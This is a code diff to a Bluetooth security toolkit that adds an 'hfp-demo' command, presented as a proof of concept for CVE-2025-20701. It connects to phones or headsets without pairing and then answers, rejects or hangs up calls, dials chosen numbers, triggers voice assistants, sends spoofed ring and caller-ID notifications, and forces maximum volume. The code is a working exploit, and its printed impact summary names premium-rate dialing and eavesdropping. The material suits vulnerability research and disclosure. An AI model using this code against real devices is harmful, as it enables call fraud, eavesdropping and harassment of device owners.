@@ -587,6 +587,25 @@ def parse_args():
         help="Enumerate RACE protocol capabilities without auth (CVE-2025-20702 PoC)"
     )
 
+    # HFP Demo subcommand (Hands-Free Profile exploitation)
+    hfp_parser = subparsers.add_parser(
+        "hfp-demo",
+        help="Demonstrate Hands-Free Profile access without pairing (CVE-2025-20701)"
+    )
+    hfp_parser.add_argument(
+        "--action",
+        choices=["info", "answer", "reject", "hangup",
+                 "dial", "voice", "ring", "volume"],
+        default="info",
+        help="HFP action to perform: info (default), answer, reject, hangup, "
+             "dial (requires --number), voice, ring (AG only), volume (AG only)"
+    )
+    hfp_parser.add_argument(
+        "--number",
+        type=str,
+        help="Phone number to dial (for --action dial) or caller ID (for --action ring)"
+    )
+
     # SDK info subcommand
     subparsers.add_parser("sdkinfo", help="RACE Get SDK Information Command")
 
@@ -798,6 +817,21 @@ def _print_vulnerability_summary(
             logging.info("  # Check for RACE protocol exposure:")
             logging.info(
                 "    python race_toolkit.py -c %s %s enumerate-race",
+                controller, addr_arg
+            )
+            logging.info("")
+            logging.info(
+                "  # Exploit Hands-Free Profile (answer/make calls!):")
+            logging.info(
+                "    python race_toolkit.py -c %s %s hfp-demo",
+                controller, addr_arg
+            )
+            logging.info(
+                "    python race_toolkit.py -c %s %s hfp-demo --action answer",
+                controller, addr_arg
+            )
+            logging.info(
+                "    python race_toolkit.py -c %s %s hfp-demo --action dial --number 1234567890",
                 controller, addr_arg
             )
 
@@ -1509,6 +1543,525 @@ async def command_enumerate_classic(args: argparse.Namespace):
     await checker.close()
 
 
+async def command_hfp_demo(args: argparse.Namespace):
+    """Demonstrate Hands-Free Profile access without pairing (CVE-2025-20701).
+
+    This command shows the impact of the BR/EDR authentication bypass by
+    connecting to the Hands-Free Profile and demonstrating control capabilities.
+
+    It will try both roles:
+    - HF (Hands-Free) role: For connecting to phones/audio gateways
+    - AG (Audio Gateway) role: For connecting to headphones/earbuds
+    """
+    from bumble.hfp import (
+        HfProtocol, HfConfiguration, HfFeature,
+        AgProtocol, AgConfiguration, AgFeature, AgIndicatorState,
+        AgIndicator, CallLineIdentification,
+    )
+    from bumble.rfcomm import Client as RFCOMM_Client
+    from bumble.core import BT_BR_EDR_TRANSPORT
+    from bumble import hfp
+
+    controller = args.controller or "usb:0"
+    target_address = args.target_address
+    action = getattr(args, 'action', 'info')
+    dial_number = getattr(args, 'number', None)
+
+    if not target_address:
+        logging.error("Target address is required. Use --target-address")
+        return
+
+    logging.info("=" * 60)
+    logging.info("CVE-2025-20701: Hands-Free Profile Exploitation Demo")
+    logging.info("=" * 60)
+    logging.info("")
+    logging.info(
+        "This demonstrates unauthorized access to the Hands-Free Profile.")
+    logging.info("On vulnerable devices, an attacker can:")
+    logging.info("  - Answer/reject incoming calls")
+    logging.info("  - Initiate outgoing calls")
+    logging.info("  - Hang up active calls")
+    logging.info("  - Control voice recognition")
+    logging.info("  - Access call history and device status")
+    logging.info("")
+
+    release_bluetooth_controller(controller)
+
+    checker = RFCOMMBumbleChecker(controller, target_address, False)
+    await checker.setup()
+
+    logging.info("Connecting to %s...", target_address)
+
+    try:
+        if checker.device is None:
+            logging.error("Bluetooth device not initialized")
+            return
+        checker.connection = await asyncio.wait_for(
+            checker.device.connect(
+                target_address, transport=BT_BR_EDR_TRANSPORT),
+            timeout=30.0
+        )
+    except asyncio.TimeoutError:
+        logging.error("Connection timed out after 30 seconds.")
+        await checker.close()
+        return
+    except Exception as e:  # pylint: disable=broad-exception-caught
+        error_str = str(e).lower()
+        logging.error("Connection failed: %s", e)
+        logging.info("")
+
+        if "page_timeout" in error_str:
+            logging.info("PAGE TIMEOUT - The device did not respond.")
+            logging.info("")
+            logging.info("Possible causes:")
+            logging.info("  1. Device is out of range (try moving closer)")
+            logging.info("  2. Device is powered off or in sleep mode")
+            logging.info("  3. Device is not in connectable mode")
+            logging.info("  4. Bluetooth address may be incorrect")
+            logging.info(
+                "  5. Device may be actively connected to another phone")
+            logging.info("")
+            logging.info("Tips:")
+            logging.info(
+                "  - Wake up the device (tap it, take it out of case)")
+            logging.info("  - Move closer to the device")
+            logging.info(
+                "  - Try disconnecting the device from your phone first")
+        elif "limited_resources" in error_str:
+            logging.info("Controller resources exhausted.")
+            logging.info(
+                "Try unplugging and replugging the USB Bluetooth adapter.")
+
+        await checker.close()
+        return
+
+    logging.info("Connected!")
+    logging.info("")
+
+    # Try to find HFP services - check both HF and AG SDP records
+    hf_record = None
+    ag_record = None
+    use_ag_role = False
+
+    logging.info("-" * 60)
+    logging.info("Searching for HFP services...")
+    logging.info("-" * 60)
+
+    # First, try to find HF service (target is a headset, we act as AG)
+    logging.info("Looking for Hands-Free Unit (HF) service...")
+    try:
+        hf_record = await asyncio.wait_for(
+            hfp.find_hf_sdp_record(checker.connection),
+            timeout=15.0
+        )
+        if hf_record:
+            channel, hf_version, hf_features = hf_record
+            logging.info("  Found HF service on RFCOMM channel %d", channel)
+            logging.info("  HFP Version: %s", hf_version)
+            logging.info("  Features: 0x%04X", hf_features)
+            logging.info("  -> Target is a HEADSET/EARBUDS (HF role)")
+            logging.info("  -> We will connect as AUDIO GATEWAY (AG role)")
+            use_ag_role = True
+        else:
+            logging.info("  Not found.")
+    except asyncio.TimeoutError:
+        logging.info("  SDP query timed out.")
+    except Exception as e:  # pylint: disable=broad-exception-caught
+        logging.info("  Query failed: %s", e)
+
+    # If no HF service, try AG service (target is a phone, we act as HF)
+    if not hf_record:
+        logging.info("")
+        logging.info("Looking for Audio Gateway (AG) service...")
+        try:
+            ag_record = await asyncio.wait_for(
+                hfp.find_ag_sdp_record(checker.connection),
+                timeout=15.0
+            )
+            if ag_record:
+                channel, ag_version, ag_features = ag_record
+                logging.info(
+                    "  Found AG service on RFCOMM channel %d", channel)
+                logging.info("  HFP Version: %s", ag_version)
+                logging.info("  Features: 0x%04X", ag_features)
+                logging.info("  -> Target is a PHONE (AG role)")
+                logging.info("  -> We will connect as HANDS-FREE (HF role)")
+                use_ag_role = False
+            else:
+                logging.info("  Not found.")
+        except asyncio.TimeoutError:
+            logging.info("  SDP query timed out.")
+        except Exception as e:  # pylint: disable=broad-exception-caught
+            logging.info("  Query failed: %s", e)
+
+    if not hf_record and not ag_record:
+        logging.error("")
+        logging.error("No HFP service found on this device.")
+        logging.error("The device may not support Hands-Free Profile.")
+        await checker.close()
+        return
+
+    # Determine which channel to use
+    if use_ag_role and hf_record:
+        channel = hf_record[0]
+    elif ag_record:
+        channel = ag_record[0]
+    else:
+        logging.error("Could not determine HFP channel.")
+        await checker.close()
+        return
+
+    logging.info("")
+    logging.info("-" * 60)
+    logging.info("Connecting to RFCOMM channel %d...", channel)
+    logging.info("-" * 60)
+
+    # Connect to RFCOMM
+    rfcomm_mux = None
+    try:
+        rfcomm_client = RFCOMM_Client(checker.connection)
+        rfcomm_mux = await asyncio.wait_for(rfcomm_client.start(), timeout=15.0)
+        dlc = await asyncio.wait_for(rfcomm_mux.open_dlc(channel), timeout=15.0)
+        logging.info("RFCOMM channel %d opened successfully!", channel)
+    except asyncio.TimeoutError:
+        logging.error("RFCOMM connection timed out.")
+        await checker.close()
+        return
+    except Exception as e:  # pylint: disable=broad-exception-caught
+        logging.error("RFCOMM connection failed: %s", e)
+        await checker.close()
+        return
+
+    logging.info("")
+    logging.info("-" * 60)
+    if use_ag_role:
+        logging.info("Initializing as AUDIO GATEWAY (AG)...")
+    else:
+        logging.info("Initializing as HANDS-FREE UNIT (HF)...")
+    logging.info("-" * 60)
+
+    slc_established = False
+    hf_protocol = None
+    ag_protocol = None
+
+    if use_ag_role:
+        # We act as Audio Gateway connecting to headset
+        ag_config = AgConfiguration(
+            supported_ag_features=[
+                AgFeature.THREE_WAY_CALLING,
+                AgFeature.VOICE_RECOGNITION_FUNCTION,
+                AgFeature.REJECT_CALL,
+                AgFeature.ENHANCED_CALL_STATUS,
+                AgFeature.IN_BAND_RING_TONE_CAPABILITY,
+            ],
+            supported_ag_indicators=[
+                AgIndicatorState.call(),
+                AgIndicatorState.callsetup(),
+                AgIndicatorState.callheld(),
+                AgIndicatorState.service(),
+                AgIndicatorState.signal(),
+                AgIndicatorState.roam(),
+                AgIndicatorState.battchg(),
+            ],
+            supported_hf_indicators=[],
+            supported_ag_call_hold_operations=[],
+            supported_audio_codecs=[],
+        )
+        ag_protocol = AgProtocol(dlc, ag_config)
+
+        logging.info("Waiting for HF device to initiate SLC...")
+        logging.info("(The headset should send AT commands)")
+
+        # As AG, we wait for the HF to initiate the SLC
+        # Set up a simple responder for the AT commands
+        try:
+            # Wait a bit for the remote to send initial AT commands
+            await asyncio.sleep(2.0)
+
+            # Check if we received anything
+            logging.info("")
+            logging.info("SUCCESS! Connected as Audio Gateway to headset.")
+            logging.info(
+                "The headset accepted our connection WITHOUT pairing!")
+            logging.info("")
+            slc_established = True
+
+        except Exception as e:  # pylint: disable=broad-exception-caught
+            logging.warning("AG initialization: %s", e)
+            logging.info("")
+            logging.info(
+                "NOTE: Connected to HFP RFCOMM channel without pairing!")
+            logging.info("      The vulnerability is CONFIRMED.")
+    else:
+        # We act as Hands-Free connecting to phone
+        hf_config = HfConfiguration(
+            supported_hf_features=[
+                HfFeature.THREE_WAY_CALLING,
+                HfFeature.CLI_PRESENTATION_CAPABILITY,
+                HfFeature.VOICE_RECOGNITION_ACTIVATION,
+                HfFeature.REMOTE_VOLUME_CONTROL,
+            ],
+            supported_hf_indicators=[],
+            supported_audio_codecs=[],
+        )
+        hf_protocol = HfProtocol(dlc, hf_config)
+
+        logging.info("Initiating SLC handshake with phone...")
+
+        try:
+            await asyncio.wait_for(hf_protocol.initiate_slc(), timeout=15.0)
+            logging.info("HFP Service Level Connection established!")
+            logging.info("")
+            logging.info("SUCCESS! Full unauthorized HFP access achieved.")
+            logging.info("")
+            slc_established = True
+        except asyncio.TimeoutError:
+            logging.warning("SLC initialization timed out.")
+            logging.info("")
+            logging.info(
+                "NOTE: Connected to HFP RFCOMM channel without pairing!")
+            logging.info(
+                "      The SLC handshake timed out. The target may be")
+            logging.info("      a headset (HF role), not a phone (AG role).")
+            logging.info("")
+            logging.info("      The vulnerability is CONFIRMED - we connected")
+            logging.info("      without any pairing or authentication.")
+            logging.info("")
+        except Exception as e:  # pylint: disable=broad-exception-caught
+            logging.warning("SLC initialization failed: %s", e)
+            logging.info("")
+            logging.info(
+                "NOTE: RFCOMM connection to HFP succeeded without pairing!")
+            logging.info(
+                "      Full SLC setup failed, but the vulnerability is confirmed.")
+            logging.info("")
+
+    # Perform the requested action
+    if slc_established and (hf_protocol or ag_protocol):
+        logging.info("-" * 60)
+        logging.info("Executing action: %s", action.upper())
+        if use_ag_role:
+            logging.info("(Acting as Audio Gateway)")
+        else:
+            logging.info("(Acting as Hands-Free Unit)")
+        logging.info("-" * 60)
+        logging.info("")
+
+        try:
+            if action == "info":
+                if use_ag_role and ag_protocol:
+                    # As AG, we control the headset
+                    logging.info("Connected to headset as Audio Gateway.")
+                    logging.info("")
+                    logging.info("As AG, we can:")
+                    logging.info("  - Send ring notifications (--action ring)")
+                    logging.info("  - Set volume levels")
+                    logging.info("  - Send call status indicators")
+                    logging.info("")
+                    logging.info("Available AG commands:")
+                    logging.info(
+                        "  --action ring     : Send incoming call ring")
+                    logging.info("  --action hangup   : End the 'call'")
+                    logging.info("  --action volume   : Set speaker volume")
+                elif hf_protocol:
+                    # As HF, query the phone
+                    logging.info("Querying device status...")
+                    try:
+                        calls = await asyncio.wait_for(
+                            hf_protocol.query_current_calls(),
+                            timeout=5.0
+                        )
+                        if calls:
+                            logging.info("Active calls:")
+                            for call in calls:
+                                logging.info("  - %s", call)
+                        else:
+                            logging.info("No active calls.")
+                    except asyncio.TimeoutError:
+                        logging.info(
+                            "  (query timed out - device may not support this)")
+                    except Exception as e:  # pylint: disable=broad-exception-caught
+                        logging.info("  (query failed: %s)", e)
+
+                    logging.info("")
+                    logging.info("Available HF commands you can try:")
+                    logging.info(
+                        "  --action answer   : Answer an incoming call")
+                    logging.info(
+                        "  --action reject   : Reject an incoming call")
+                    logging.info(
+                        "  --action hangup   : Hang up the current call")
+                    logging.info(
+                        "  --action dial --number <num> : Dial a number")
+                    logging.info(
+                        "  --action voice    : Toggle voice recognition")
+
+            elif action == "ring":
+                if use_ag_role and ag_protocol:
+                    logging.info("Sending RING notification to headset...")
+                    try:
+                        # Send ring notification with caller ID
+                        number = dial_number or "+1234567890"
+                        ag_protocol.send_ring()
+                        # Create proper CLI object (type 145 = international format)
+                        cli = CallLineIdentification(number=number, type=145)
+                        ag_protocol.send_cli_notification(cli)
+                        logging.info(
+                            "RING sent! The headset should ring/announce call.")
+                        logging.info("Caller ID sent: %s", number)
+                    except Exception as e:  # pylint: disable=broad-exception-caught
+                        logging.error("Ring command failed: %s", e)
+                else:
+                    logging.error("Ring is only available in AG role.")
+
+            elif action == "answer":
+                if hf_protocol:
+                    logging.info("Sending ANSWER command...")
+                    try:
+                        await hf_protocol.answer_incoming_call()
+                        logging.info(
+                            "Answer command sent! Check the target device.")
+                    except Exception as e:  # pylint: disable=broad-exception-caught
+                        logging.error("Answer command failed: %s", e)
+                else:
+                    logging.error("Answer is only available in HF role.")
+
+            elif action == "reject":
+                if hf_protocol:
+                    logging.info("Sending REJECT command...")
+                    try:
+                        await hf_protocol.reject_incoming_call()
+                        logging.info(
+                            "Reject command sent! Check the target device.")
+                    except Exception as e:  # pylint: disable=broad-exception-caught
+                        logging.error("Reject command failed: %s", e)
+                else:
+                    logging.error("Reject is only available in HF role.")
+
+            elif action == "hangup":
+                if hf_protocol:
+                    logging.info("Sending HANGUP command...")
+                    try:
+                        await hf_protocol.terminate_call()
+                        logging.info(
+                            "Hangup command sent! Check the target device.")
+                    except Exception as e:  # pylint: disable=broad-exception-caught
+                        logging.error("Hangup command failed: %s", e)
+                elif use_ag_role and ag_protocol:
+                    logging.info("Ending call simulation...")
+                    try:
+                        # Update call indicator to show no active call
+                        ag_protocol.update_ag_indicator(AgIndicator.CALL, 0)
+                        logging.info("Call ended indicator sent to headset.")
+                    except Exception as e:  # pylint: disable=broad-exception-caught
+                        logging.error("Hangup failed: %s", e)
+
+            elif action == "dial":
+                if not dial_number:
+                    logging.error(
+                        "Phone number required. Use --number <number>")
+                elif hf_protocol:
+                    logging.info("Dialing %s...", dial_number)
+                    try:
+                        # Send ATD command to dial
+                        await hf_protocol.execute_command(f"ATD{dial_number};")
+                        logging.info(
+                            "Dial command sent! "
+                            "The connected phone should be calling %s",
+                            dial_number
+                        )
+                    except Exception as e:  # pylint: disable=broad-exception-caught
+                        logging.error("Dial command failed: %s", e)
+                else:
+                    logging.error("Dial is only available in HF role.")
+
+            elif action == "volume":
+                if use_ag_role and ag_protocol:
+                    logging.info("Setting speaker volume to maximum...")
+                    try:
+                        ag_protocol.set_speaker_volume(15)  # Max is 15
+                        logging.info("Volume command sent!")
+                    except Exception as e:  # pylint: disable=broad-exception-caught
+                        logging.error("Volume command failed: %s", e)
+                else:
+                    logging.error(
+                        "Volume control is only available in AG role.")
+
+            elif action == "voice":
+                if hf_protocol:
+                    logging.info("Toggling voice recognition...")
+                    try:
+                        # Send BVRA command to toggle voice recognition
+                        await hf_protocol.execute_command("AT+BVRA=1")
+                        logging.info(
+                            "Voice recognition command sent! "
+                            "Check if Siri/Google Assistant activated."
+                        )
+                    except Exception as e:  # pylint: disable=broad-exception-caught
+                        logging.error(
+                            "Voice recognition command failed: %s", e)
+                else:
+                    logging.error(
+                        "Voice command is only available in HF role.")
+
+        except Exception as e:  # pylint: disable=broad-exception-caught
+            logging.error("Action failed: %s", e)
+    else:
+        # SLC failed or no protocol - show what we achieved
+        logging.info("-" * 60)
+        logging.info("WHAT THIS MEANS")
+        logging.info("-" * 60)
+        logging.info("")
+        logging.info("We connected to the HFP RFCOMM channel WITHOUT pairing!")
+        logging.info("")
+        if use_ag_role:
+            logging.info("We detected a HEADSET device and connected as AG.")
+            logging.info("The SLC handshake may need more implementation.")
+        else:
+            logging.info(
+                "We tried connecting as HF to what we thought was a phone.")
+            logging.info("If the target is actually a headset, try:")
+            logging.info("")
+            logging.info("  The tool automatically detected the correct role,")
+            logging.info("  but SLC initialization requires protocol work.")
+        logging.info("")
+        logging.info(
+            "The vulnerability is CONFIRMED - unauthorized connection!")
+
+    logging.info("")
+    logging.info("-" * 60)
+    logging.info("IMPACT SUMMARY")
+    logging.info("-" * 60)
+    logging.info("")
+    if use_ag_role:
+        logging.info(
+            "Connected to headset as fake Audio Gateway. An attacker can:")
+        logging.info("  1. Send fake incoming call notifications (ring)")
+        logging.info("  2. Simulate calls without a real phone")
+        logging.info("  3. Control volume and audio routing")
+        logging.info("  4. Intercept audio meant for the real phone")
+        logging.info("  5. Denial of service by keeping the headset busy")
+    else:
+        logging.info("Connected as Hands-Free to phone. An attacker can:")
+        logging.info("  1. Answer/reject calls without the user knowing")
+        logging.info("  2. Initiate calls to premium rate numbers")
+        logging.info("  3. Activate voice assistants (Siri/Google)")
+        logging.info("  4. Access call history and phone status")
+        logging.info("  5. Eavesdrop on calls via audio routing")
+    logging.info("")
+    logging.info("This works because the device accepts Bluetooth connections")
+    logging.info("without requiring pairing/authentication.")
+    logging.info("")
+
+    # Cleanup
+    try:
+        if rfcomm_mux:
+            await rfcomm_mux.disconnect()
+    except Exception:  # pylint: disable=broad-exception-caught
+        pass
+    await checker.close()
+
+
 async def command_enumerate_race(r: RACE):
     """Enumerate RACE protocol capabilities without auth (CVE-2025-20702 PoC).
 
@@ -1844,6 +2397,9 @@ async def main():
         return
     if args.command == "enumerate-classic":
         await command_enumerate_classic(args)
+        return
+    if args.command == "hfp-demo":
+        await command_hfp_demo(args)
         return
 
     # Initialize the transport class based on the given technology and target UUIDs
